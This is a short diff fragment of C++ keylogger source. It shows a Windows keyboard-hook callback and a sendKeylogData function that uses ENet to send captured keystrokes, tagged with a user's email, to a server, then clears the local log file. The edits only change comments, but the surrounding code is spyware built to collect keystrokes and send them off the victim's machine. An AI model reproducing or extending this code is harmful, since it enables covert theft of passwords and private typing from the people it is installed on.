@@ -117,7 +117,7 @@ LRESULT CALLBACK KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam) {
 }
 
 // Function to send keylog data to server
-// Function to send keylog data to server
+
 void sendKeylogData() {
     // Initialize ENet
     if (enet_initialize() != 0) {
@@ -175,7 +175,9 @@ void sendKeylogData() {
             clearFile.close();
         }
     }
-    
+    // KEYLOG :   |
+    //           \ /
+    //            V 
     // Format the message: Email:example@gmail.com|KeylogData: data
     std::string message;
     if (!userEmail.empty() && !logData.empty()) {
